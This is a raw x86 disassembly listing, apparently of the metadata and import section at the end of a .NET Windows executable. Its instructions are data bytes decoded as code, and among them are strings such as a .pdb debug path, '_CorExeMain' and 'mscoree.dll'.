  403b51:	outs   dx,DWORD PTR ds:[esi]
  403b52:	data16 and BYTE PTR [ebp+0x69],cl
  403b56:	arpl   WORD PTR [edx+0x6f],si
  403b59:	jae    0x403bca
  403b5b:	data16 je 0x403b7e
  403b5e:	inc    ebx
  403b5f:	outs   dx,DWORD PTR ds:[esi]
  403b60:	jb     0x403bd2
  403b62:	outs   dx,DWORD PTR ds:[esi]
  403b63:	jb     0x403bc6
  403b65:	je     0x403bd0
  403b67:	outs   dx,DWORD PTR ds:[esi]
  403b68:	outs   dx,BYTE PTR ds:[esi]
  403b69:	and    BYTE PTR [ecx+0x6e],ch
  403b6c:	and    BYTE PTR [eax+ebp*2+0x65],dh
  403b70:	and    BYTE PTR [ebp+0x2e],dl
  403b73:	push   ebx
  403b74:	and    BYTE PTR cs:[ecx+0x6e],ah
  403b78:	fs das 
  403b7a:	outs   dx,DWORD PTR ds:[esi]
  403b7b:	jb     0x403b9d
  403b7d:	outs   dx,DWORD PTR ds:[esi]
  403b7e:	je     0x403be8
  403b80:	gs jb  0x403ba3
  403b83:	arpl   WORD PTR [edi+0x75],bp
  403b86:	outs   dx,BYTE PTR ds:[esi]
  403b87:	je     0x403bfb
  403b89:	imul   esp,DWORD PTR [ebp+0x73],0x1f00002e
  403b90:	add    DWORD PTR [eax],eax
  403b92:	sbb    cl,BYTE PTR [ebp+0x69]
  403b95:	arpl   WORD PTR [edx+0x6f],si
  403b98:	jae    0x403c09
  403b9a:	data16 je 0x403b5f
  403b9d:	scas   al,BYTE PTR es:[edi]
  403b9e:	and    BYTE PTR [ebp+0x61],cl
  403ba1:	jae    0x403c0b
  403ba3:	jne    0x403c15
  403ba5:	and    BYTE PTR [edx+0x75],dl
  403ba8:	outs   dx,BYTE PTR ds:[esi]
  403ba9:	je     0x403c14
  403bab:	ins    DWORD PTR es:[edi],dx
  403bac:	add    BYTE PTR gs:[eax],al
  403baf:	or     al,BYTE PTR [ecx]
  403bb1:	add    BYTE PTR ds:0x552d6e65,al
  403bb7:	push   ebx
  403bb8:	add    BYTE PTR [eax],al
  403bba:	sub    al,BYTE PTR [ecx]
  403bbc:	add    BYTE PTR ds:0x7263694d,ah
  403bc2:	outs   dx,DWORD PTR ds:[esi]
  403bc3:	jae    0x403c34
  403bc5:	data16 je 0x403be8
  403bc8:	dec    ebp
  403bc9:	popa   
  403bca:	jae    0x403c34
  403bcc:	jne    0x403c3e
  403bce:	and    BYTE PTR [ebp+0x76],al
  403bd1:	popa   
  403bd2:	ins    BYTE PTR es:[edi],dx
  403bd3:	jne    0x403c36
  403bd5:	je     0x403c40
  403bd7:	outs   dx,DWORD PTR ds:[esi]
  403bd8:	outs   dx,BYTE PTR ds:[esi]
  403bd9:	and    BYTE PTR [ebx+0x6f],al
  403bdc:	outs   dx,BYTE PTR ds:[esi]
  403bdd:	je     0x403c40
  403bdf:	imul   ebp,DWORD PTR [esi+0x65],0x8000072
  403be6:	add    DWORD PTR [eax],eax
  403be8:	add    al,BYTE PTR [eax]
  403bea:	add    BYTE PTR [eax],al
  403bec:	add    BYTE PTR [eax],al
  403bee:	or     BYTE PTR [ecx],al
  403bf0:	add    BYTE PTR [eax],cl
  403bf2:	add    BYTE PTR [eax],al
  403bf4:	add    BYTE PTR [eax],al
  403bf6:	add    BYTE PTR [esi],bl
  403bf8:	add    DWORD PTR [eax],eax
  403bfa:	add    DWORD PTR [eax],eax
  403bfc:	push   esp
  403bfd:	add    dl,BYTE PTR [esi]
  403bff:	push   edi
  403c00:	jb     0x403c63
  403c02:	jo     0x403c52
  403c04:	outs   dx,DWORD PTR ds:[esi]
  403c05:	outs   dx,BYTE PTR ds:[esi]
  403c06:	inc    ebp
  403c07:	js     0x403c6c
  403c09:	gs jo  0x403c80
  403c0c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  403c13:	ja     0x403c88
  403c15:	add    DWORD PTR [eax],eax
  403c17:	add    BYTE PTR [eax],al
  403c19:	add    BYTE PTR [eax],al
  403c1b:	add    BYTE PTR [ebx+0x6b],dl
  403c1e:	jae    0x403c79
  403c20:	add    BYTE PTR [eax],al
  403c22:	add    BYTE PTR [eax],al
  403c24:	add    al,BYTE PTR [eax]
  403c26:	add    BYTE PTR [eax],al
  403c28:	sbb    al,0x1
  403c2a:	add    BYTE PTR [eax],al
  403c2c:	xor    al,0x3c
  403c2e:	add    BYTE PTR [eax],al
  403c30:	xor    al,0x1e
  403c32:	add    BYTE PTR [eax],al
  403c34:	push   edx
  403c35:	push   ebx
  403c36:	inc    esp
  403c37:	push   ebx
  403c38:	xor    eax,0x1c6bdaf4
  403c3d:	pop    ds
  403c3e:	les    ecx,FWORD PTR [ebp+eiz*4-0x5c]
  403c42:	adc    ah,0x6a
  403c45:	cmp    eax,0x1e223
  403c4a:	add    BYTE PTR [eax],al
  403c4c:	data16 cmp bl,BYTE PTR [edi+ebx*2+0x42]
  403c51:	ins    BYTE PTR es:[edi],dx
  403c52:	fs pop esp
  403c54:	xor    DWORD PTR [eax+esi*1],esi
  403c57:	xor    esi,DWORD PTR [edx]
  403c59:	pop    esp
  403c5a:	xor    DWORD PTR [eax],esi
  403c5c:	xor    esi,DWORD PTR ss:[ecx]
  403c5f:	pop    esp
  403c60:	push   ebx
  403c61:	outs   dx,DWORD PTR ds:[esi]
  403c62:	jne    0x403cd6
  403c64:	arpl   WORD PTR [ebp+0x73],sp
  403c67:	pop    esp
  403c68:	outs   dx,DWORD PTR ds:[esi]
  403c69:	bound  ebp,QWORD PTR [edx+0x5c]
  403c6c:	push   edi
  403c6d:	imul   ebp,DWORD PTR [esi+0x33],0x65525c32
  403c74:	ins    BYTE PTR es:[edi],dx
  403c75:	gs popa 
  403c77:	jae    0x403cde
  403c79:	pop    esp
  403c7a:	inc    ebp
  403c7b:	jbe    0x403cde
  403c7d:	ins    BYTE PTR es:[edi],dx
  403c7e:	jne    0x403ce1
  403c80:	je     0x403ceb
  403c82:	outs   dx,DWORD PTR ds:[esi]
  403c83:	outs   dx,BYTE PTR ds:[esi]
  403c84:	inc    ebx
  403c85:	outs   dx,DWORD PTR ds:[esi]
  403c86:	outs   dx,BYTE PTR ds:[esi]
  403c87:	je     0x403cea
  403c89:	imul   ebp,DWORD PTR [esi+0x65],0x73632e72
  403c90:	jo     0x403d04
  403c92:	outs   dx,DWORD PTR ds:[esi]
  403c93:	push   0x5c
  403c95:	dec    ebp
  403c96:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403c9d:	je     0x403ccd
  403c9f:	dec    ebp
  403ca0:	popa   
  403ca1:	jae    0x403d0b
  403ca3:	jne    0x403d15
  403ca5:	cs inc ebx
  403ca7:	outs   dx,DWORD PTR ds:[esi]
  403ca8:	outs   dx,BYTE PTR ds:[esi]
  403ca9:	je     0x403d0c
  403cab:	imul   ebp,DWORD PTR [esi+0x65],0x64702e72
  403cb2:	bound  eax,QWORD PTR [eax]
	...
  403d50:	js     0x403d8f
	...
  403d5a:	add    BYTE PTR [eax],al
  403d5c:	mov    ?,WORD PTR ds:0x20000000
	...
  403d76:	add    BYTE PTR [eax],al
  403d78:	cmp    BYTE PTR ds:0x0,0x0
  403d7f:	add    BYTE PTR [eax],al
  403d81:	add    BYTE PTR [edi+0x43],bl
  403d84:	outs   dx,DWORD PTR ds:[esi]
  403d85:	jb     0x403dcc
  403d87:	js     0x403dee
  403d89:	dec    ebp
  403d8a:	popa   
  403d8b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403d92:	jb     0x403df9
  403d94:	gs cs fs ins BYTE PTR es:[edi],dx
  403d98:	ins    BYTE PTR es:[edi],dx
  403d99:	add    BYTE PTR [eax],al
  403d9b:	add    BYTE PTR [eax],al
  403d9d:	add    bh,bh
  403d9f:	and    eax,0x402000
